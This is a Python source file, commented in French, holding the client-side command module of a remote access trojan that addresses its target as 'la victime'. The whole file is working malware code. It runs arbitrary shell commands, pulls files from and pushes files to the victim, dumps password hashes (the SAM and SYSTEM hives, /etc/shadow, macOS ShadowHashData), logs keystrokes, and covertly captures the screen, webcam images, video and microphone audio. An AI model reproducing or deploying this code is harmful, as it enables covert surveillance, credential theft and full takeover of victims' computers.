"""Implémentation des commandes exécutées côté client."""

import logging
import os
import platform
import subprocess
import tempfile
import threading
import time
import wave
from pathlib import Path

logger = logging.getLogger(__name__)

SYSTEM = platform.system()

HELP_TEXT = """Commandes disponibles :
  help                          Afficher cette aide
  download <chemin>             Récupérer un fichier de la victime
  upload <local> <distant>      Envoyer un fichier vers la victime
  shell <commande>              Exécuter une commande shell
  shell                         Ouvrir un shell interactif
  ipconfig                      Configuration réseau
  screenshot                    Capture d'écran
  search <chemin> <motif>       Rechercher des fichiers
  hashdump                      Dump des hash (SAM / shadow / dscl)
  keylogger <start|stop|dump>   Keylogger
  webcam_snapshot               Photo webcam
  webcam_stream <secondes>      Vidéo webcam
  record_audio <secondes>       Enregistrement audio
  back                          Revenir au menu principal"""


def cmd_help() -> str:
    return HELP_TEXT


def _run(cmd: list[str], timeout: int = 10) -> subprocess.CompletedProcess:
    """Exécute une commande et retourne le résultat."""
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def cmd_ipconfig() -> str:
    """Récupère la configuration réseau (Windows / Linux / macOS)."""
    try:
        if SYSTEM == "Windows":
            result = _run(["ipconfig", "/all"])
        elif SYSTEM == "Darwin":
            result = _run(["ifconfig"])
        else:
            try:
                result = _run(["ip", "addr"])
            except FileNotFoundError:
                result = _run(["ifconfig"])
        return result.stdout or result.stderr or "(pas de sortie)"
    except FileNotFoundError:
        return "Erreur : commande réseau introuvable sur cet OS"
    except Exception as exc:
        logger.error("ipconfig failed: %s", exc)
        return f"Erreur : {exc}"


def cmd_shell(command: str) -> str:
    """Exécute une commande shell unique."""
    try:
        if SYSTEM == "Windows":
            executable = "cmd.exe"
        elif os.path.exists("/bin/zsh") and SYSTEM == "Darwin":
            executable = "/bin/zsh"
        else:
            executable = "/bin/bash"
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            executable=executable,
        )
        output = result.stdout + result.stderr
        return output if output.strip() else "(pas de sortie)"
    except subprocess.TimeoutExpired:
        return "Erreur : commande expirée (timeout 30s)"
    except Exception as exc:
        logger.error("Shell failed: %s", exc)
        return f"Erreur : {exc}"


def cmd_download(filepath: str) -> tuple[bytes, str] | str:
    """Lit un fichier et retourne son contenu."""
    try:
        path = Path(filepath)
        if not path.exists():
            return f"Erreur : fichier introuvable : {filepath}"
        if not path.is_file():
            return f"Erreur : {filepath} n'est pas un fichier"
        data = path.read_bytes()
        logger.info("Fichier lu : %s (%d octets)", filepath, len(data))
        return data, path.name
    except PermissionError:
        return f"Erreur : permission refusée : {filepath}"
    except Exception as exc:
        logger.error("Download failed: %s", exc)
        return f"Erreur : {exc}"


def cmd_upload(filepath: str, data: bytes) -> str:
    """Écrit des données dans un fichier."""
    try:
        path = Path(filepath)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        logger.info("Fichier écrit : %s (%d octets)", filepath, len(data))
        return f"Fichier envoyé vers {filepath} ({len(data)} octets)"
    except Exception as exc:
        logger.error("Upload failed: %s", exc)
        return f"Erreur : {exc}"


def cmd_search(search_path: str, pattern: str) -> str:
    """Recherche des fichiers correspondant à un motif."""
    try:
        search_dir = Path(search_path)
        if not search_dir.exists():
            return f"Erreur : répertoire introuvable : {search_path}"
        results: list[str] = []
        for match in search_dir.rglob(pattern):
            results.append(str(match))
            if len(results) >= 200:
                results.append("... (tronqué à 200 résultats)")
                break
        return "\n".join(results) if results else "Aucun fichier trouvé"
    except Exception as exc:
        logger.error("Search failed: %s", exc)
        return f"Erreur : {exc}"


# ── Screenshot ───────────────────────────────────────────────────


def _screenshot_mss() -> tuple[bytes, str] | str:
    """Capture d'écran via mss (cross-platform)."""
    import mss
    import mss.tools

    with mss.mss() as sct:
        monitor = sct.monitors[0]
        img = sct.grab(monitor)
        png_data = mss.tools.to_png(img.rgb, img.size)
        return png_data, "screenshot.png"


def _screenshot_macos() -> tuple[bytes, str] | str:
    """Capture d'écran via screencapture (macOS natif)."""
    tmp_path = os.path.join(tempfile.gettempdir(), "rat_screenshot.png")
    result = subprocess.run(
        ["screencapture", "-x", tmp_path],
        capture_output=True,
        timeout=10,
    )
    if result.returncode != 0:
        return f"Erreur screencapture : {result.stderr.decode()}"
    if not os.path.exists(tmp_path):
        return "Erreur : screencapture n'a pas produit de fichier"
    with open(tmp_path, "rb") as f:
        data = f.read()
    os.remove(tmp_path)
    return data, "screenshot.png"


def cmd_screenshot() -> tuple[bytes, str] | str:
    """Prend une capture d'écran (mss avec fallback natif sur macOS)."""
    try:
        result = _screenshot_mss()
        if isinstance(result, tuple) and len(result[0]) > 0:
            logger.info("Screenshot pris via mss (%d octets)", len(result[0]))
            return result
    except ImportError:
        pass
    except Exception as exc:
        logger.warning("mss failed, trying native fallback: %s", exc)

    if SYSTEM == "Darwin":
        try:
            result = _screenshot_macos()
            if isinstance(result, tuple):
                logger.info("Screenshot pris via screencapture (%d octets)", len(result[0]))
            return result
        except Exception as exc:
            logger.error("screencapture failed: %s", exc)
            return f"Erreur : {exc}"

    return "Erreur : capture d'écran impossible (mss non installé ou permissions manquantes)"


# ── Hashdump ─────────────────────────────────────────────────────


def _hashdump_windows() -> str:
    sam_path = os.path.join(tempfile.gettempdir(), "sam.save")
    sys_path = os.path.join(tempfile.gettempdir(), "system.save")
    subprocess.run(
        ["reg", "save", "HKLM\\SAM", sam_path, "/y"],
        capture_output=True,
        timeout=10,
    )
    subprocess.run(
        ["reg", "save", "HKLM\\SYSTEM", sys_path, "/y"],
        capture_output=True,
        timeout=10,
    )
    parts: list[str] = []
    for label, path in [("SAM", sam_path), ("SYSTEM", sys_path)]:
        if os.path.exists(path):
            size = os.path.getsize(path)
            parts.append(f"{label} dump : {size} octets")
            os.remove(path)
    return "\n".join(parts) if parts else "Erreur : dump impossible (droits administrateur requis)"


def _hashdump_linux() -> str:
    shadow = Path("/etc/shadow")
    if not shadow.exists():
        return "Erreur : /etc/shadow introuvable"
    try:
        return shadow.read_text()
    except PermissionError:
        return "Erreur : droits root requis pour lire /etc/shadow"


def _hashdump_macos() -> str:
    try:
        result = _run(
            ["dscl", ".", "-readall", "/Users", "dsAttrTypeNative:ShadowHashData"], timeout=15
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout
        result = _run(
            ["sudo", "dscl", ".", "-readall", "/Users", "dsAttrTypeNative:ShadowHashData"],
            timeout=15,
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout
        return "Erreur : droits administrateur requis (sudo) pour accéder aux hash macOS"
    except Exception as exc:
        return f"Erreur : {exc}"


def cmd_hashdump() -> str:
    """Récupère les hash de mots de passe (Windows: SAM, Linux: shadow, macOS: dscl)."""
    try:
        if SYSTEM == "Windows":
            return _hashdump_windows()
        elif SYSTEM == "Darwin":
            return _hashdump_macos()
        else:
            return _hashdump_linux()
    except Exception as exc:
        logger.error("Hashdump failed: %s", exc)
        return f"Erreur : {exc}"


# ── Keylogger ────────────────────────────────────────────────────


class Keylogger:
    """Enregistreur de frappes clavier (singleton thread-safe)."""

    _instance: "Keylogger | None" = None
    _lock = threading.Lock()

    def __init__(self) -> None:
        self._keys: list[str] = []
        self._listener = None
        self._running = False
        self._keys_lock = threading.Lock()

    @classmethod
    def get_instance(cls) -> "Keylogger":
        with cls._lock:
            if cls._instance is None:
                cls._instance = cls()
            return cls._instance

    def start(self) -> str:
        if self._running:
            return "Keylogger déjà actif"
        try:
            from pynput import keyboard

            def on_press(key):
                with self._keys_lock:
                    try:
                        self._keys.append(key.char)
                    except AttributeError:
                        self._keys.append(f"[{key.name}]")

            self._listener = keyboard.Listener(on_press=on_press)
            self._listener.start()
            self._running = True
            logger.info("Keylogger démarré")
            return "Keylogger démarré"
        except ImportError:
            return "Erreur : module pynput non installé"
        except Exception as exc:
            logger.error("Keylogger start failed: %s", exc)
            return f"Erreur : {exc}"

    def stop(self) -> str:
        if not self._running:
            return "Keylogger non actif"
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._running = False
        logger.info("Keylogger arrêté")
        return "Keylogger arrêté"

    def dump(self) -> str:
        with self._keys_lock:
            captured = "".join(self._keys)
            self._keys.clear()
        return captured if captured else "(aucune frappe enregistrée)"


def cmd_keylogger(action: str) -> str:
    """Gère le keylogger : start, stop, dump."""
    kl = Keylogger.get_instance()
    actions = {"start": kl.start, "stop": kl.stop, "dump": kl.dump}
    handler = actions.get(action)
    if handler is None:
        return f"Erreur : action inconnue '{action}'. Utiliser start, stop ou dump"
    return handler()


# ── Webcam ───────────────────────────────────────────────────────


def _webcam_opencv() -> tuple[bytes, str] | str:
    """Capture webcam via OpenCV."""
    import cv2

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    time.sleep(0.5)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    _, buffer = cv2.imencode(".png", frame)
    return buffer.tobytes(), "webcam_snapshot.png"


def _webcam_imagesnap() -> tuple[bytes, str] | str:
    """Capture webcam via imagesnap (macOS)."""
    tmp_path = os.path.join(tempfile.gettempdir(), "rat_webcam.png")
    result = subprocess.run(
        ["imagesnap", "-w", "1", tmp_path],
        capture_output=True,
        timeout=10,
    )
    if result.returncode != 0:
        return None
    if not os.path.exists(tmp_path):
        return None
    with open(tmp_path, "rb") as f:
        data = f.read()
    os.remove(tmp_path)
    return data, "webcam_snapshot.png"


def _webcam_ffmpeg_snapshot() -> tuple[bytes, str] | str:
    """Capture webcam via ffmpeg (cross-platform)."""
    tmp_path = os.path.join(tempfile.gettempdir(), "rat_webcam.png")
    if SYSTEM == "Darwin":
        input_device = ["-f", "avfoundation", "-i", "0"]
    elif SYSTEM == "Windows":
        input_device = ["-f", "dshow", "-i", "video=0"]
    else:
        input_device = ["-f", "v4l2", "-i", "/dev/video0"]

    cmd = ["ffmpeg", "-y"] + input_device + ["-frames:v", "1", tmp_path]
    subprocess.run(cmd, capture_output=True, timeout=15)
    if not os.path.exists(tmp_path):
        return None
    with open(tmp_path, "rb") as f:
        data = f.read()
    os.remove(tmp_path)
    if len(data) == 0:
        return None
    return data, "webcam_snapshot.png"


def cmd_webcam_snapshot() -> tuple[bytes, str] | str:
    """Prend une photo webcam (OpenCV > imagesnap > ffmpeg)."""
    # Essai OpenCV
    try:
        result = _webcam_opencv()
        if isinstance(result, tuple):
            logger.info("Webcam snapshot via OpenCV")
            return result
    except ImportError:
        pass
    except Exception as exc:
        logger.warning("OpenCV webcam failed: %s", exc)

    # Essai imagesnap (macOS)
    if SYSTEM == "Darwin":
        try:
            result = _webcam_imagesnap()
            if isinstance(result, tuple):
                logger.info("Webcam snapshot via imagesnap")
                return result
        except FileNotFoundError:
            pass
        except Exception as exc:
            logger.warning("imagesnap failed: %s", exc)

    # Essai ffmpeg
    try:
        result = _webcam_ffmpeg_snapshot()
        if isinstance(result, tuple):
            logger.info("Webcam snapshot via ffmpeg")
            return result
    except FileNotFoundError:
        pass
    except Exception as exc:
        logger.warning("ffmpeg webcam failed: %s", exc)

    return "Erreur : webcam inaccessible (OpenCV, imagesnap et ffmpeg échoués)"


def _webcam_stream_opencv(duration: int) -> tuple[bytes, str] | str:
    """Enregistrement vidéo via OpenCV."""
    import cv2

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None

    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    fps = 20.0
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    tmp_path = os.path.join(tempfile.gettempdir(), "rat_webcam_stream.avi")
    out = cv2.VideoWriter(tmp_path, fourcc, fps, (width, height))

    time.sleep(0.5)
    end_time = time.time() + duration
    frame_count = 0
    while time.time() < end_time:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        frame_count += 1

    cap.release()
    out.release()

    if frame_count == 0:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)
        return None

    with open(tmp_path, "rb") as f:
        video_data = f.read()
    os.remove(tmp_path)
    return video_data, "webcam_stream.avi"


def _webcam_stream_ffmpeg(duration: int) -> tuple[bytes, str] | str:
    """Enregistrement vidéo via ffmpeg."""
    tmp_path = os.path.join(tempfile.gettempdir(), "rat_webcam_stream.avi")
    if SYSTEM == "Darwin":
        input_device = ["-f", "avfoundation", "-framerate", "20", "-i", "0"]
    elif SYSTEM == "Windows":
        input_device = ["-f", "dshow", "-i", "video=0"]
    else:
        input_device = ["-f", "v4l2", "-framerate", "20", "-i", "/dev/video0"]

    cmd = (
        ["ffmpeg", "-y"]
        + input_device
        + ["-t", str(duration), "-c:v", "libx264", "-preset", "ultrafast", tmp_path]
    )
    subprocess.run(cmd, capture_output=True, timeout=duration + 15)
    if not os.path.exists(tmp_path):
        return None
    with open(tmp_path, "rb") as f:
        video_data = f.read()
    os.remove(tmp_path)
    if len(video_data) == 0:
        return None
    return video_data, "webcam_stream.avi"


def cmd_webcam_stream(duration: int = 5) -> tuple[bytes, str] | str:
    """Enregistre une vidéo webcam (OpenCV > ffmpeg)."""
    try:
        result = _webcam_stream_opencv(duration)
        if isinstance(result, tuple):
            logger.info("Webcam stream via OpenCV (%d octets)", len(result[0]))
            return result
    except ImportError:
        pass
    except Exception as exc:
        logger.warning("OpenCV stream failed: %s", exc)

    try:
        result = _webcam_stream_ffmpeg(duration)
        if isinstance(result, tuple):
            logger.info("Webcam stream via ffmpeg (%d octets)", len(result[0]))
            return result
    except FileNotFoundError:
        pass
    except Exception as exc:
        logger.warning("ffmpeg stream failed: %s", exc)

    return "Erreur : enregistrement webcam impossible (OpenCV et ffmpeg échoués)"


# ── Audio ────────────────────────────────────────────────────────


def _record_audio_pyaudio(duration: int) -> tuple[bytes, str] | str:
    """Enregistrement audio via PyAudio."""
    import pyaudio

    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 1
    rate = 44100

    p = pyaudio.PyAudio()
    stream = p.open(
        format=sample_format,
        channels=channels,
        rate=rate,
        frames_per_buffer=chunk,
        input=True,
    )

    frames: list[bytes] = []
    total_chunks = int(rate / chunk * duration)
    for _ in range(total_chunks):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    sample_width = p.get_sample_size(sample_format)
    p.terminate()

    tmp_path = os.path.join(tempfile.gettempdir(), "rat_recording.wav")
    with wave.open(tmp_path, "wb") as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(sample_width)
        wf.setframerate(rate)
        wf.writeframes(b"".join(frames))

    with open(tmp_path, "rb") as f:
        audio_data = f.read()
    os.remove(tmp_path)
    return audio_data, "recording.wav"


def _record_audio_ffmpeg(duration: int) -> tuple[bytes, str] | str:
    """Enregistrement audio via ffmpeg."""
    tmp_path = os.path.join(tempfile.gettempdir(), "rat_recording.wav")
    if SYSTEM == "Darwin":
        input_device = ["-f", "avfoundation", "-i", ":0"]
    elif SYSTEM == "Windows":
        input_device = ["-f", "dshow", "-i", "audio=0"]
    else:
        input_device = ["-f", "pulse", "-i", "default"]

    cmd = ["ffmpeg", "-y"] + input_device + ["-t", str(duration), tmp_path]
    subprocess.run(cmd, capture_output=True, timeout=duration + 15)
    if not os.path.exists(tmp_path):
        return None
    with open(tmp_path, "rb") as f:
        audio_data = f.read()
    os.remove(tmp_path)
    if len(audio_data) == 0:
        return None
    return audio_data, "recording.wav"


def cmd_record_audio(duration: int = 5) -> tuple[bytes, str] | str:
    """Enregistre l'audio du microphone (PyAudio > ffmpeg)."""
    try:
        result = _record_audio_pyaudio(duration)
        if isinstance(result, tuple):
            logger.info("Audio enregistré via PyAudio (%d octets)", len(result[0]))
            return result
    except ImportError:
        pass
    except Exception as exc:
        logger.warning("PyAudio failed: %s", exc)

    try:
        result = _record_audio_ffmpeg(duration)
        if isinstance(result, tuple):
            logger.info("Audio enregistré via ffmpeg (%d octets)", len(result[0]))
            return result
    except FileNotFoundError:
        pass
    except Exception as exc:
        logger.warning("ffmpeg audio failed: %s", exc)

    return "Erreur : enregistrement audio impossible (PyAudio et ffmpeg échoués)"
